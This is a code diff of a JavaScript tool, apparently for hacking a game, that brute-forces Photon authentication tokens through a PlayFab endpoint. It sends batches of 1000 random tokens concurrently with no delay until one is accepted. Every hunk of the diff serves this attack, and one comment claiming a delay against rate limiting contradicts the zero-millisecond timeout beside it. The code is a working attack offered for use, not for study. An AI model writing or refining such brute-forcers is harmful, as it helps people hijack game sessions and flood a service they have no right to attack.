@@ -458,7 +458,6 @@
     let levelEditorIntervalId = null;
     let bruteforceRunning = false;
     let photonTokenRunning = false;
-    let foundValid = false;
     let photonTokenIntervalId = null;
     let failedAttempts = 0;
 
@@ -1494,7 +1493,7 @@
       }
     }
 
-function generateRandomToken() {
+ function generateRandomToken() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
   const tokenLength = 50; // Standard UUID-like length for Photon tokens
   let token = '';
@@ -1513,13 +1512,7 @@ async function checkToken(playFabId, token) {
         'X-Authorization': sessionTicket
       }
     });
-    let result;
-    try {
-      result = await response.json();
-    } catch (jsonError) {
-      return { token, error: `Invalid JSON response (Status: ${response.status})` };
-    }
-    return { token, result };
+    return { token, result: await response.json() };
   } catch (error) {
     return { token, error: error.message };
   }
@@ -1542,46 +1535,38 @@ async function startBruteforce() {
   }
 
   bruteforceRunning = true;
-  failedAttempts = 0;
-  foundValid = false;
-  output.textContent = "Token bruteforcer enabled! Spamming as fast as possible!\n";
+  failedAttempts = 0; // Reset failed attempts counter
+  let foundValid = false; // Declare foundValid here
+  output.textContent = "Token bruteforcer enabled! We will notify you when we find a valid token.\n";
 
   async function tryTokenBatch() {
     if (!bruteforceRunning) return;
 
-    const batchSize = 1000; // Keep batch size at 1000
-    const subBatchSize = 1000; // Push to 50 concurrent requests
+    const batchSize = 1000;
     const tokens = Array.from({ length: batchSize }, generateRandomToken);
+    const results = await Promise.all(tokens.map(token => checkToken(playFabId, token)));
+
     const outputBuffer = [];
 
-    // Process tokens in sub-batches
-    for (let i = 0; i < tokens.length; i += subBatchSize) {
-      if (!bruteforceRunning) break;
-
-      const subBatch = tokens.slice(i, i + subBatchSize);
-      const results = await Promise.all(subBatch.map(token => checkToken(playFabId, token)));
-
-      for (const { token, result, error } of results) {
-        if (error) {
-          outputBuffer.push(`Error for token ${token}: ${error}`);
-          failedAttempts++;
-        } else if (result.resultCode === 1) {
-          outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
-          foundValid = true;
-        } else {
-          failedAttempts++;
-        }
+    for (const { token, result, error } of results) {
+      if (error) {
+        outputBuffer.push(`Error for token ${token}: ${error}`);
+        failedAttempts++; // Increment failed attempts
+      } else if (result.resultCode === 1) {
+        outputBuffer.push(`✅ Valid token found: ${token} (Failed Attempts: ${failedAttempts})`);
+        foundValid = true;
+      } else {
+        failedAttempts++; // Increment failed attempts for invalid tokens
       }
     }
 
-    // Update output only for errors or valid tokens
     if (outputBuffer.length > 0) {
       output.textContent += outputBuffer.join('\n') + '\n';
       output.scrollTop = output.scrollHeight;
     }
 
     if (!foundValid && bruteforceRunning) {
-      setTimeout(tryTokenBatch, 0); // No delay between batches
+      setTimeout(tryTokenBatch, 0); // Delay to prevent rate limiting
     } else if (foundValid) {
       stopBruteforce();
     }
